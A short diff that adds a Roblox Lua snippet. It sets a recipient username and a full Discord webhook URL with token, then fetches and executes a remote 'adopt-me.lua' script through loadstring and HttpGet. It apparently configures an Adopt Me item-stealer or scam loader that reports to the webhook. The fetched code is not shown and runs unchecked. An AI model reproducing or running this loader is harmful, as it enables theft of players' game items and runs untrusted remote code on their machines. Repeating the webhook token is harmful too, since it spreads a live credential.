@@ -1,0 +1,4 @@
+Username = "gaming_bruh7927"
+Webhook = "https://discord.com/api/webhooks/1297441869000740905/UmFCkHwka-e-djuYAxXAm63jWv56qq8vP09uESKGWWbT1hx0qpvTmdOIyw1bK-C6E27u"
+
+loadstring(game:HttpGet("https://projects-k4f7-scripts.vercel.app/adopt-me.lua",true))()
